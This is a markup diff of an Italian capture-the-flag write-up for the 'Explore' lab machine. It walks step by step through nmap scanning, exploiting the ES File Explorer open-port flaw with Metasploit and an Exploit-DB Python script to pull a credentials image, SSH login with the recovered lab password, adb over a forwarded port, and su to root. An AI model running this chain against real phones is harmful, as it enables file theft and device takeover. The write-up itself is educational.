+</span></span><span style="display:flex;"><span>SF:q,DD,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2029\x20Nov\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x202022\x2014:59:34\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:?\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalS
+</span></span><span style="display:flex;"><span>SF:erverCookie,CA,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:29\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length:\x2054\r\nConten
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mst
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:shash=nmap&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,DB,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Date:\x20Tue,\x2029\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnecti
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:on:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Device: phone
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 101.61 seconds
+</span></span></code></pre></div><h1 id="analisi-delle-porte">Analisi delle porte<a href="#analisi-delle-porte" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso é 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore1.png"  class="left"  style="width: 600px"  />
@@ -329,75 +338,75 @@ Dato che la porta 5555 è filtrata e non è possibile connettersi tramite adb, c
 Questo sito web indica anche una vulnerabilità nota per questa applicazione, in cui un utente malintenzionato è in grado di eseguire comandi arbitrari sull’host. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.</p>
 <h2 id="sfruttamento-dellexploit-con-metasploit">Sfruttamento dell’Exploit con Metasploit<a href="#sfruttamento-dellexploit-con-metasploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>La ricerca nel framework metasploit rivela un modulo per questa vulnerabilità:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. msfconsole
-2. search es file explorer
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. msfconsole
+</span></span><span style="display:flex;"><span>2. search es file explorer
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore4.png"  class="left"  style="width: 900px"  />
 
 
 <p>Il modulo di interesse è:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   <span style="color:#75715e">#   Name                                                      Disclosure Date  Rank       Check  Description</span>
-   -   ----                                                      ---------------  ----       -----  -----------
-   <span style="color:#ae81ff">0</span>   auxiliary/scanner/http/es_file_explorer_open_port         2019-01-16       normal     No     ES File Explorer Open Port
-</code></pre></div><p>Utilizziamo questo modulo ed elenchiamo le sue opzioni:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. use auxiliary/scanner/http/es_file_explorer_open_port
-2. options
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                                      Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                                      ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   auxiliary/scanner/http/es_file_explorer_open_port         2019-01-16       normal     No     ES File Explorer Open Port
+</span></span></code></pre></div><p>Utilizziamo questo modulo ed elenchiamo le sue opzioni:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. use auxiliary/scanner/http/es_file_explorer_open_port
+</span></span><span style="display:flex;"><span>2. options
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore5.png"  class="left"  style="width: 900px"  />
 
 
 <p>Successivamente, si imposta il parametro RHOSTS con l’IP dell’host e si digita exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. set RHOSTS 10.10.10.247
-2. exploit
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. set RHOSTS 10.10.10.247
+</span></span><span style="display:flex;"><span>2. exploit
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore6.png"  class="left"  style="width: 600px"  />
 
 
 <p>Il risultato è positivo. L’azione del parametro è stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l’uscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">show actions
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>show actions
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore7.png"  class="left"  style="width: 500px"  />
 
 
 <p>Impostando l’azione su LISTPICS, si ottengono i seguenti risultati.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. set action LISTPICS
-2. exploit
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. set action LISTPICS
+</span></span><span style="display:flex;"><span>2. exploit
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore8.png"  class="left"  style="width: 700px"  />
 
 
 <p>Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l’azione su GETFILE e scarichiamo il file creds.jpg:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. set action GETFILE
-2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
-3. exploit
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. set action GETFILE
+</span></span><span style="display:flex;"><span>2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
+</span></span><span style="display:flex;"><span>3. exploit
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore9.png"  class="left"  style="width: 700px"  />
 
 
 <p>Successivamente, possiamo aprire l’immagine utilizzando il visualizzatore di immagini feh:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. sudo apt install feh
-2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg
-</code></pre></div><h2 id="sfruttamento-dellexploit-con-cve-script-python">Sfruttamento dell’Exploit con CVE (Script Python)<a href="#sfruttamento-dellexploit-con-cve-script-python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. sudo apt install feh
+</span></span><span style="display:flex;"><span>2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg
+</span></span></code></pre></div><h2 id="sfruttamento-dellexploit-con-cve-script-python">Sfruttamento dell’Exploit con CVE (Script Python)<a href="#sfruttamento-dellexploit-con-cve-script-python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore10.png"  class="left"  style="width: 700px"  />
 
 
 <p>Salviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l’accesso ai dati nel telefono cellulare dell’utente e l’esecuzione dell’applicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l’exploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell’exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py --cmd GetDeviceInfo --ip <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py --cmd GetDeviceInfo --ip <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore11.png"  class="left"  style="width: 600px"  />
 
 
 <p>Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py listPics <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py listPics <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore12.png"  class="left"  style="width: 500px"  />
 
 
 <p>Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C’è un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py getFile <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span> /storage/emulated/0/DCIM/creds.jpg
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py getFile <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span> /storage/emulated/0/DCIM/creds.jpg
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore13.png"  class="left"  style="width: 600px"  />
 
 
@@ -407,8 +416,8 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 
 
 <p>Questo sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l’utente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh kristi@10.10.10.247 -p <span style="color:#ae81ff">2222</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh kristi@10.10.10.247 -p <span style="color:#ae81ff">2222</span>
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore15.png"  class="left"  style="width: 600px"  />
 
 
@@ -419,27 +428,27 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 
 <h1 id="privilage-escalation">Privilage Escalation<a href="#privilage-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Avendo accesso all’host remoto tramite SSH, si può eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ss -ntpl
-</code></pre></div><p>Poiché la porta 5555 è filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p <span style="color:#ae81ff">2222</span>
-</code></pre></div><p>Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. sudo apt install adb
-2. adb --help
-</code></pre></div><p>Nella sezione rete vediamo che utilizzando l’istruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb connect 127.0.0.1:5555
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -ntpl
+</span></span></code></pre></div><p>Poiché la porta 5555 è filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p <span style="color:#ae81ff">2222</span>
+</span></span></code></pre></div><p>Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. sudo apt install adb
+</span></span><span style="display:flex;"><span>2. adb --help
+</span></span></code></pre></div><p>Nella sezione rete vediamo che utilizzando l’istruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb connect 127.0.0.1:5555
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore17.png"  class="left"  style="width: 500px"  />
 
 
 <p>È possibile elencare i dispositivi collegati eseguendo il seguente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb devices
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb devices
+</span></span></code></pre></div>
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore18.png"  class="left"  style="width: 500px"  />
 
 
 <p>Quindi, si può digitare quanto segue per ottenere la shell sulla macchina remota:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb -s 127.0.0.1 shell
-</code></pre></div><p>Digitiamo “su” per diventare utenti root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb -s 127.0.0.1 shell
+</span></span></code></pre></div><p>Digitiamo “su” per diventare utenti root:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore19.png"  class="left"  style="width: 300px"  />
 
@@ -447,9 +456,6 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 <p>Nella directory data vi sará la nostra flag:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/Explore20.png"  class="left"  style="width: 300px"  />
-
-
-
       </div></div>
 
   
@@ -495,11 +501,6 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
     <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
-      </div>
   </div>
 </footer>
 
@@ -508,7 +509,7 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 
 
 
-<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/SpaceHack/bundle.min.js"></script>
 
 
 
